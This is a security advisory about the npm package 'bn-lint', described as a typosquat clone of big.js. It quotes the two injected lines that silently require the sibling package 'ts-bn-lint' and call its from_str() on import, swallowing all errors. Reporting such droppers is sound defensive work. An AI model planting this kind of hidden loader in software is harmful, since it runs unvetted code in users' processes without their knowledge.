summary: bn-lint impersonates big.js and silently loads ts-bn-lint payload on import
details: Package 'bn-lint' is a typosquat/clone of the legitimate 'big.js' arbitrary-precision math library: it ships verbatim source, copyright header, README, and author metadata (Michael Mclaughlin <M8ch88l@gmail.com>) from big.js. The only deviation from upstream is two injected lines at big.js:605-606 (and identically at big.mjs:605-606, the ESM entry exposed via package.json exports.import): `const helper = require("ts-bn-lint"); helper.from_str().then(e => e).catch(e => { });`. This unconditionally pulls in the sibling package 'ts-bn-lint' and invokes its `from_str()` on every require/import of bn-lint, with all errors silently swallowed so the consumer sees nothing. Whatever code ts-bn-lint ships executes inside any process that imports bn-lint, in both CommonJS and ESM resolution paths. The lure (clean big.js clone) plus a hidden dependency loader to a sibling typosquat is a dependency-chain dropper: the harmful payload is delegated to the transitive package and runs at module-load time without consent or visibility.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
